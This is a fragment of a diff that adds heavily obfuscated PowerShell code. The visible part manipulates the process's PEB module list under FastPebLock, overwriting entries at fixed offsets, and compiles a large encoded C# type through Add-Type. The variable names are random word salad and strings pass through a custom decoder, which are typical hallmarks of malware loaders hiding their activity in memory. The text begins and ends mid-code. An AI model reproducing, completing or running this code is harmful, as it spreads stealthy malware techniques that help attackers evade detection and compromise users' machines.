+        $UnstyNonnablyEvicallyByrious = $BaroxerPressReasesHountilla.Ldr32.ToInt64();
+    }
+    else {
+        $UnstyNonnablyEvicallyByrious = $BaroxerPressReasesHountilla.Ldr64.ToInt64();
+    };
+    $MirthroidCarburkenProfesMinedUndare = New-Object System.Intptr -ArgumentList $UnstyNonnablyEvicallyByrious;
+    $OsticPhobiaLepsing = [system.runtime.interopservices.marshal]::PtrToStructure($MirthroidCarburkenProfesMinedUndare, [type]$EldingAvementsShundrynxConterBakerapy);
+    
+    
+    $SupplingLunkedBuzzlier = [Activator]::CreateInstance($DemoteinDorsersTweedsHayocyticSable);
+    $SupplingLunkedBuzzlier = $SupplingLunkedBuzzlier.GetType();
+    $UnstyNonnablyEvicallyByrious = $OsticPhobiaLepsing.InLoadOrderModuleList.Flink.ToInt64();
+    $MirthroidCarburkenProfesMinedUndare = New-Object System.Intptr -ArgumentList $UnstyNonnablyEvicallyByrious;
+    
+    
+    while ($YoutflageBiasionBogators -ne $OsticPhobiaLepsing.InLoadOrderModuleList.Blink) {
+        $ConderNetisSupersUning = [system.runtime.interopservices.marshal]::PtrToStructure($MirthroidCarburkenProfesMinedUndare, [type]$SupplingLunkedBuzzlier);
+        [string] $DricalandOutpongRefilmenExtir = (lkjhgfdszxcvbnpoiuytredfgh "d#e!g^e0re0rq8qe0re0r*g7ib6daa&11");
+        [string]$ReatsSolvedFellsShirous=(lkjhgfdszxcvbnpoiuytredfgh "5a#!g^#mk#mk&11bg8");
+         
+          write-host $DricalandOutpongRefilmenExtir
+        write-host $ConderNetisSupersUning.$DricalandOutpongRefilmenExtir.$ReatsSolvedFellsShirous
+        if ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ConderNetisSupersUning.$DricalandOutpongRefilmenExtir.$ReatsSolvedFellsShirous) -like (lkjhgfdszxcvbnpoiuytredfgh "^8*kd&!igs!0&11bg8^d@fi0&11e0re0r@&8&11c0m&11^8*")) {
+          
+                [UInt32]$TraneScledCommutherChoasPadcaps = 16;
+                $SubsisUtinglyDiporousNonesses = $UnstyNonnablyEvicallyByrious + 0x48;
+                $LexesPolingAdassiacSardsBombates = $UnstyNonnablyEvicallyByrious + 0x58;
+            
+            
+            
+            $AstinousMonelikeSleasisWomatorsWhites = New-Object (lkjhgfdszxcvbnpoiuytredfgh "1c4k!2^d@^b1&11daa@&8pnm0fd^b1kd&^b1bg8") -ArgumentList $SubsisUtinglyDiporousNonesses;
+            $UniocresJaroudaeVitistlyBeens = New-Object (lkjhgfdszxcvbnpoiuytredfgh "1c4k!2^d@^b1&11daa@&8pnm0fd^b1kd&^b1bg8") -ArgumentList $LexesPolingAdassiacSardsBombates;
+    			
+            MultrasTymologicPhotone  $DendriteScritySwuntersTellopsWarave  $AstinousMonelikeSleasisWomatorsWhites  $TraneScledCommutherChoasPadcaps  $TeaceaeImprismInticPiquiting;
+            MultrasTymologicPhotone  $DendriteScritySwuntersTellopsWarave  $UniocresJaroudaeVitistlyBeens  $TraneScledCommutherChoasPadcaps  $TeaceaeImprismInticPiquiting;
+        }
+        $YoutflageBiasionBogators = $UnstyNonnablyEvicallyByrious = $ConderNetisSupersUning.InLoadOrderLinks.Flink.ToInt64();
+        $MirthroidCarburkenProfesMinedUndare = New-Object System.Intptr -ArgumentList $UnstyNonnablyEvicallyByrious;
+    };
+    
+    
+    if ($DiamydianPartsSpliidateNookhtary) {
+        $ChrygosBulismXerontosCheral::RtlLeaveCriticalSection($BaroxerPressReasesHountilla.FastPebLock32);
+    }
+    else {
+        $ChrygosBulismXerontosCheral::RtlLeaveCriticalSection($BaroxerPressReasesHountilla.FastPebLock64);
+    } 
+   
+}
+
+
+
+
+Add-Type -TypeDefinition (lkjhgfdszxcvbnpoiuytredfgh "tds6ff!g^^d@5qs0fd38a6q81c4k!2^d@^b1&11daaiq!tds6ff!g^^d@5qs0fd38a6q81c4k!2^d@^b1&11daa@&8%h(!g^0fd^b15qsdaa&11@&8pnm0fd^b1&11bg8!igkd&1c4&11bg8pok5qs5et&11^d@iq!tds6ff!g^^d@5qs0fd38a6q81c4k!2^d@^b1&11daa@&8%h(&11#mke0r&115et^b15qs!ig0fdiq!tds6ff!g^^d@5qs0fd38a6q81c4k!2^d@^b1&11daa@&8%h(!g^0fd^b15qsdaa&11iq!tds6ff!g^^d@5qs0fd38a6q81c4k!2^d@^b1&11daa@&8%h(!g^0fd^b15qsdaa&11@&8jmc!igdaakd&5qse0r&11bg81c4&11bg8pok5qs5et&11^d@iq!tds6fftds6ffkd&!g^7*le0r5qs5et6q85ete0rib6^d@^d@6q8*g7ib6^b15qspok&11a2q&11^b1fi0!ignhf^d@6q83nntds6ff6q86q86q86q87(cq8qe0re0rpnmdaakd&!igbg8^b1nae34&!ige0r&11fd425j@&8nhfe0re0r34&&7k6q8jmcfi0ib6bg81c4&11^b16q8js#6q8jmcfi0ib6bg81c4&11^b1@&8tir0fd5qs5et!ignhf&11&7k6q8(k0c0mib65et^b11c4kd&&11e0re0r5qs0fd38a6q8js#6q8^b1bg8!g^&11&7k6q8pktbg8&11^d@&11bg8pok&111c45qs38a6q8js#6q8#mkib6e0r^d@&11b!l3oqtds6ff6q86q86q86q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11b!l3oqtds6ff6q86q86q86q8kd&!g^7*le0r5qs5et6q8^d@^b1ib6^b15qs5et6q8&11c0m^b1&11bg80fd6q8!ig7*lshd&115et^b16q8jmc!igai7&11^b1#@07*lshd&115et^b1nae^d@^b1bg85qs0fd38a6q8kd&^d@&n(*g7ib6daa&11&7k6q87(cpnm0fd3oq6q8bg8&11#mk6q85a#pnm*g7q8qs(l#@0pktbj61c4fd46q8kd&5a#5qs0fdnhf#@0kd&^b15qs!ig0fd^d@&7k6q87(cpnm0fd&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8apdpkt1c4^b1bg8!g^5et^b1b!l3oq6q8ai7!g^5qsnhf6q8bg85qs5qsnhfb!liq!tds6ffgi#tds6ffgi#7(cq8qe0re0rpnmdaakd&!igbg8^b1nae34&0fd^b1nhfe0re0r@&8nhfe0re0r34&&7k6q8jmcfi0ib6bg81c4&11^b16q8js#6q8jmcfi0ib6bg81c4&11^b1@&8qht0fd^d@5qs&7k6q81c4&11^b1apdib6^d@^b1(k0bg8bg8!igbg86q8js#6q8^b1bg8!g^&11b!l3oqtds6ff6q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8^d@^b1ib6^b15qs5et6q8&11c0m^b1&11bg80fd6q8pnm0fd^b1pkt^b1bg86q8%h(^b1e0rai7&11^b1jmc!g^bg8bg8&110fd^b1pkt&117*lnaeb!liq!tds6ff6q86q86q86q86q86q86q86q87(cq8qe0re0rpnmdaakd&!igbg8^b1nae34&0fd^b1nhfe0re0r@&8nhfe0re0r34&&7k6q8jmcfi0ib6bg81c4&11^b16q8js#6q8jmcfi0ib6bg81c4&11^b1@&8tir0fd5qs5et!ignhf&11&7k6q81c4&11^b1apdib6^d@^b1(k0bg8bg8!igbg86q8js#6q8^b1bg8!g^&11b!l3oqtds6ff6q86q86q86q86q86q86q86q8kd&!g^7*le0r5qs5et6q8^d@^b1ib6^b15qs5et6q8&11c0m^b1&11bg80fd6q8pok!ig5qsnhf6q8%h(^b1e0rpnm0fd5qs^b1tir0fd5qs5et!ignhf&111c4^b1bg85qs0fd38anaepnm0fd^b1pkt^b1bg86q8nhf&11^d@5et&7k6q8^d@^b1bg85qs0fd38a6q8^d@^b1bg8b!liq!tds6ffq*9tds6fftds6fftds6fftds6ff7(cai7!g^5qsnhfnae34&29k4(%c1@7*lnhf25j25j@(j21cib6#mkc1@3f421cc1@nhf3f4^!721c7*lc1@#hj25j21cc1@c1@fd4ib657l3f4@(j^!74(%7*l4(%29k34&b!l&7k6q8pnm0fd^b1&11bg8#mkib65et&11bj6k!2kd&&11naejmc!igdaapnm0fd^b1&11bg8#mkib65et&11bj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11pnm^d@pnmtir0fd(&50fd!igs!00fdb!l3oqtds6ffkd&!g^7*le0r5qs5et6q85qs0fd^b1&11bg8#mkib65et&116q8pnm(k0e0r&11pokib6^b1&11nhfd#eib65et^b1!igbg8k!21c4&11bg8pok&11bg86q83nntds6ff6q86q86q86q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11b!l3oqtds6ff6q86q86q86q8!ig7*lshd&115et^b16q81c4&11bg8pok&11bg8jmcbg8&11ib6^b1&11(k0e0r&11pokib6^b1&11nhf#@07*lshd&115et^b1nae7(cpnm0fd&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8apdpkt1c4^b1bg8!g^5et^b1b!l3oq6q8ai7!g^5qsnhf6q8bg85ete0r^d@5qsnhf&7k6q87(cpnm0fd&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8apdpkt1c4^b1bg8!g^5et^b1b!l3oq6q8ai7!g^5qsnhf6q8bg85qs5qsnhfb!liq!tds6ffq*9tds6fftds6ff7(cjmc!igdaapnmdaakd&!igbg8^b1&7k6q8ai7!g^5qsnhfnae34&#hjjmc29k@(jd#efd425j4(%21cq8q(k0(k0fd421cc1@q8qq8q^!721c5a##hj3f425j21cqhtfd44(%fd4d#e25j@(j5a#4(%@(j^!7(k034&b!l&7k6q8pnm0fd^b1&11bg8#mkib65et&11bj6k!2kd&&11naejmc!igdaapnm0fd^b1&11bg8#mkib65et&11bj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11pnm^d@q8q!g^ib6e0rb!l&7k6q81c4k!2^d@^b1&11daa@&81c4&115et!g^bg85qs^b1k!2@&81c4!g^kd&kd&bg8&11^d@^d@tir0fddaaib60fdib638a&11nhfjmc!ignhf&111c4&115et!g^bg85qs^b1k!23oqtds6ffkd&!g^7*le0r5qs5et6q85qs0fd^b1&11bg8#mkib65et&116q8pnm%h(&1138a5qs^d@^b1&11bg8&11nhfbj6ib6^d@(&56q83nntds6ff6q86q86q86q8^d@^b1bg85qs0fd38a6q8*g7ib6daa&116q83nn6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q8^d@^b1bg85qs0fd38a6q8pktib6^b1fi06q83nn6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q8!g^5qs0fd^b16q81c4^b1ib6^b1&116q83nn6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q87*l!ig!ige0r6q8(k00fdib67*le0r&11nhf6q83nn6q838a&11^b1iq!6q8^d@&11^b1iq!6q8q*9tds6ff6q86q86q86q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11b!l3oqtds6ff6q86q86q86q8!ig7*lshd&115et^b16q8%h(!g^0fdnae7(cpnm0fd&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&81c4^b1bg8!g^5et^b1b!l3oq6q8!ig7*lshd&115et^b16q8kd&ib6bg8ib6daa&11^b1&11bg8^d@b!liq!tds6ff6q86q86q86q8q8qib6^b1&11bj65qsdaa&116q8apdib6^d@^b1%h(!g^0fdbj65qsdaa&116q83nn6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q85qs0fd^b16q8apdib6^d@^b1bj6ib6^d@(&5%h(&11^d@!g^e0r^b16q83nn6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q85qs0fd^b16q8*g7!g^daa7*l&11bg8#@0#mka2q5qs^d@^d@&11nhf%h(!g^0fd^d@6q83nn6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q8q8qib6^b1&11bj65qsdaa&116q8*g7&11c0m^b1%h(!g^0fdbj65qsdaa&116q83nn6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q8!ig7*lshd&115et^b16q8q8q&11#mk5qs0fd5qs^b15qs!ig0fd6q83nn6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q8^d@^b1bg85qs0fd38a6q87cldaae0r6q83nn6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#1c4^b1bg8b!l3oqtds6ff6q86q86q86q8^d@^b1bg85qs0fd38a6q8ai7&11^b11c4&115et!g^bg85qs^b1k!2q8q&11^d@5etbg85qskd&^b1!igbg8nae5qs0fd^b16q8^d@&115et!g^bg85qs^b1k!2pnm0fd#mk!igbg8daaib6^b15qs!ig0fdb!liq!tds6ff6q86q86q86q8pok!ig5qsnhf6q81c4&11^b11c4&115et!g^bg85qs^b1k!2q8q&11^d@5etbg85qskd&^b1!igbg8nae7(cpnm0fd&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#1c4^b1bg8b!l3oq6q8^d@^b1bg85qs0fd38a6q8^d@nhfnhfe0r&7k6q87(cpnm0fd3oq6q85qs0fd^b16q8#mke0rib638a^d@b!liq!tds6ff6q86q86q86q8pok!ig5qsnhf6q81c4^b1!igkd&nae5qs0fd^b16q8#mke0rib638a^d@b!liq!tds6ffq*9tds6fftds6ff6q87(cjmc!igdaapnmdaakd&!igbg8^b1&7k6q8ai7!g^5qsnhfnae34&29kjmcd#eqhtjmc4(%@(j25j21cqht4(%29k4(%21cc1@jmc^!757l21c#hjqht29k29k21cqhtqht3f4jmc25jqhtd#e29k4(%q8qd#ejmc34&b!l&7k6q8pnm0fd^b1&11bg8#mkib65et&11bj6k!2kd&&11naejmc!igdaapnm0fd^b1&11bg8#mkib65et&11bj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11pnm^d@q8q!g^ib6e0rb!l&7k6q81c4k!2^d@^b1&11daa@&81c4&115et!g^bg85qs^b1k!2@&81c4!g^kd&kd&bg8&11^d@^d@tir0fddaaib60fdib638a&11nhfjmc!ignhf&111c4&115et!g^bg85qs^b1k!2&7k6q8q8q&11#mkib6!g^e0r^b1a2q&11daa7*l&11bg8nae34&pktib6^b1fi034&b!l3oqtds6ff6q86q86q86q86q86q86q86q85qs0fd^b1&11bg80fdib6e0r6q85qs0fd^b1&11bg8#mkib65et&116q8pnmbj6ib6^d@(&5d#e!ige0rnhf&11bg8tds6ff6q86q86q86q86q86q86q86q83nntds6ff6q86q86q86q86q86q86q86q86q86q86q86q8^d@^b1bg85qs0fd38a6q8*g7ib6daa&116q83nn6q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#1c4^b1bg8b!l3oq6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8^d@^b1bg85qs0fd38a6q8pktib6^b1fi06q83nn6q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#1c4^b1bg8b!l3oq6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8pnmbj6ib6^d@(&5d#e!ige0rnhf&11bg86q8ai7&11^b1d#e!ige0rnhf&11bg8nae7(ca2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#1c4^b1bg8b!l3oq6q8^d@^b1bg85qs0fd38a6q8pktib6^b1fi0b!liq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8!ig7*lshd&115et^b16q8ai7&11^b1d#e!ige0rnhf&11bg8^d@nae5qs0fd^b16q8#mke0rib638a^d@b!liq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8pnmbj6ib6^d@(&5d#e!ige0rnhf&11bg86q8jmcbg8&11ib6^b1&11d#e!ige0rnhf&11bg8naeb!liq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8pok!ig5qsnhf6q8q8q&11e0r&11^b1&11d#e!ige0rnhf&11bg8naeb!liq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8pnm%h(&1138a5qs^d@^b1&11bg8&11nhfbj6ib6^d@(&56q8ai7&11^b1bj6ib6^d@(&5naeb!liq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8!ig7*lshd&115et^b16q8ai7&11^b1bj6ib6^d@(&5^d@nae5qs0fd^b16q8#mke0rib638a^d@b!liq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8pok!ig5qsnhf6q8q8q&11e0r&11^b1&11bj6ib6^d@(&5naeb!liq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8pnm%h(&1138a5qs^d@^b1&11bg8&11nhfbj6ib6^d@(&56q8%h(&1138a5qs^d@^b1&11bg8bj6ib6^d@(&5nae7(cpnm0fd&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#1c4^b1bg8b!l3oq6q8^d@^b1bg85qs0fd38a6q8pktib6^b1fi0&7k6q87(cpnm0fd&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#1c4^b1bg8b!l3oq6q8^d@^b1bg85qs0fd38a6q87cldaae0rbj6&11c0m^b1&7k6q87(cpnm0fd3oq6q85qs0fd^b16q8#mke0rib638a^d@&7k6q87(cpnm0fd&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&81c4^b1bg8!g^5et^b1b!l3oq6q8!ig7*lshd&115et^b16q8tir^d@&11bg8pnmnhf&7k6q87(cpnm0fd&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&81c4^b1bg8!g^5et^b1b!l3oq6q8!ig7*lshd&115et^b16q8kd&ib6^d@^d@s!0!igbg8nhf&7k6q87(cpnm0fd3oq6q85qs0fd^b16q8apd!ig38a!ig0fdbj6k!2kd&&11&7k6q87(cpnm0fd&7k6q8#@0kd&^b15qs!ig0fdib6e0r&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&81c4^b1bg8!g^5et^b1b!l3oq6q8!ig7*lshd&115et^b16q8^d@nhfnhfe0rb!liq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8pnm%h(&1138a5qs^d@^b1&11bg8&11nhfbj6ib6^d@(&56q8%h(&1138a5qs^d@^b1&11bg8bj6ib6^d@(&5q8q&11#mk5qs0fd5qs^b15qs!ig0fdnaeb!liq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#1c4^b1bg8b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8^d@^b1bg85qs0fd38a6q8ai7&11^b11c4&115et!g^bg85qs^b1k!2q8q&11^d@5etbg85qskd&^b1!igbg8nae5qs0fd^b16q8^d@&115et!g^bg85qs^b1k!2pnm0fd#mk!igbg8daaib6^b15qs!ig0fdb!liq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q8pok!ig5qsnhf6q81c4&11^b11c4&115et!g^bg85qs^b1k!2q8q&11^d@5etbg85qskd&^b1!igbg8nae7(cpnm0fd&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#1c4^b1bg8b!l3oq6q8^d@^b1bg85qs0fd38a6q8^d@nhfnhfe0r&7k6q87(cpnm0fd3oq6q85qs0fd^b16q8#mke0rib638a^d@b!liq!tds6ff6q86q86q86q86q86q86q86q8q*9tds6fftds6ff6q86q86q86q86q86q86q86q87(cjmc!igdaapnmdaakd&!igbg8^b1&7k6q8q8q&11#mkib6!g^e0r^b1a2q&11daa7*l&11bg8nae34&bj6ib6bg838a&11^b11c4&11bg8pok&11bg834&b!l&7k6q8ai7!g^5qsnhfnae34&25jd#eqht5a#qhtc1@jmc3f421cc1@q8qqht#hj21cc1@4(%^!7fd421c#hj@(j#hj3f421c25j4(%jmcjmcfd4d#eq8qc1@4(%d#e29k57l34&b!l&7k6q81c4k!2^d@^b1&11daa@&81c4&115et!g^bg85qs^b1k!2@&81c4!g^kd&kd&bg8&11^d@^d@tir0fddaaib60fdib638a&11nhfjmc!ignhf&111c4&115et!g^bg85qs^b1k!23oqtds6ff6q86q86q86q86q86q86q86q85qs0fd^b1&11bg80fdib6e0r6q85qs0fd^b1&11bg8#mkib65et&116q8pnmbj6ib6^d@(&51c4&11bg8pok5qs5et&11tds6ff6q86q86q86q86q86q86q86q83nntds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(ca2q&11^b1fi0!ignhfpnmdaakd&e0rnaea2q&11^b1fi0!ignhfpnmdaakd&e0r#@0kd&^b15qs!ig0fd^d@@&8pnm0fd^b1&11bg80fdib6e0rjmcib6e0re0r&7k6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&116q8js#6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&11@&8%h(!g^0fd^b15qsdaa&11b!l&7k6q8q8q5qs^d@kd&pnmnhfnae^!7b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8pnmbj6ib6^d@(&5d#e!ige0rnhf&11bg86q8ai7&11^b1d#e!ige0rnhf&11bg8nae7(cpnm0fd&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&85a#1c4^b1bg8b!l3oq6q8^d@^b1bg85qs0fd38a6q8pktib6^b1fi0b!liq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(ca2q&11^b1fi0!ignhfpnmdaakd&e0rnaea2q&11^b1fi0!ignhfpnmdaakd&e0r#@0kd&^b15qs!ig0fd^d@@&8pnm0fd^b1&11bg80fdib6e0rjmcib6e0re0r&7k6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&116q8js#6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&11@&8%h(!g^0fd^b15qsdaa&11b!l&7k6q8q8q5qs^d@kd&pnmnhfnae25jb!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8!ig7*lshd&115et^b16q8ai7&11^b1%h(!g^0fd0fd5qs0fd38abj6ib6^d@(&5^d@nae5qs0fd^b16q8#mke0rib638a^d@b!liq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cbg8&11^b1!g^bg80fd#lt6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&8pnm0fd^b1&11bg8#mkib65et&11b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(ca2q&11^b1fi0!ignhfpnmdaakd&e0rnaea2q&11^b1fi0!ignhfpnmdaakd&e0r#@0kd&^b15qs!ig0fd^d@@&8pnm0fd^b1&11bg80fdib6e0rjmcib6e0re0r&7k6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&116q8js#6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&11@&8%h(!g^0fd^b15qsdaa&11b!l&7k6q8q8q5qs^d@kd&pnmnhfnaefd4b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8!ig7*lshd&115et^b16q8*g7&11s!0bj6ib6^d@(&5nae7(cpnm0fd3oq6q8!g^5qs0fd^b16q8#mke0rib638a^d@b!liq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(ca2q&11^b1fi0!ignhfpnmdaakd&e0rnaea2q&11^b1fi0!ignhfpnmdaakd&e0r#@0kd&^b15qs!ig0fd^d@@&8pnm0fd^b1&11bg80fdib6e0rjmcib6e0re0r&7k6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&116q8js#6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&11@&8%h(!g^0fd^b15qsdaa&11b!l&7k6q8q8q5qs^d@kd&pnmnhfnaec1@b!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q8pok!ig5qsnhf6q8jmc!ig0fd0fd&115et^b1nae7(cpnm0fd&7k6q8#@0kd&^b15qs!ig0fdib6e0r&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&81c4^b1bg8!g^5et^b1b!l3oq6q8!ig7*lshd&115et^b16q8^d@&11bg8pok&11bg8*g7ib6daa&11&7k6q87(cpnm0fd&7k6q8#@0kd&^b15qs!ig0fdib6e0r&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&81c4^b1bg8!g^5et^b1b!l3oq6q8!ig7*lshd&115et^b16q8!g^^d@&11bg8&7k6q87(cpnm0fd&7k6q8#@0kd&^b15qs!ig0fdib6e0r&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&81c4^b1bg8!g^5et^b1b!l3oq6q8!ig7*lshd&115et^b16q8nhf!igdaaib65qs0fd&7k6q87(cpnm0fd&7k6q8#@0kd&^b15qs!ig0fdib6e0r&7k6q8a2qib6bg8^d@fi0ib6e0rqht^d@naetir0fddaaib60fdib638a&11nhfbj6k!2kd&&11@&81c4^b1bg8!g^5et^b1b!l3oq6q8!ig7*lshd&115et^b16q8kd&ib6^d@^d@s!0!igbg8nhfb!liq!tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cq8q5qs^d@kd&pnmnhfnae57lb!l3oqtds6ff6q86q86q86q86q86q86q86q86q86q86q86q87*l!ig!ige0r6q8jmc!ig0fd0fd&115et^b1&11nhf6q83nn6q87(ca2q&11^b1fi0!ignhfpnmdaakd&e0rnaea2q&11^b1fi0!ignhfpnmdaakd&e0r#@0kd&^b15qs!ig0fd^d@@&8pnm0fd^b1&11bg80fdib6e0rjmcib6e0re0r&7k6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&116q8js#6q8a2q&11^b1fi0!ignhfjmc!ignhf&11bj6k!2kd&&11@&8%h(!g^0fd^b15qsdaa&11b!l&7k6q8q8q5qs^d@kd&pnmnhfnae57lb!l3oq6q838a&11^b1iq!6q8q*9tds6ff6q86q86q86q86q86q86q86q86q86q86q86q87(cq8q5qs^d@kd&pnmnhfnae4(%b!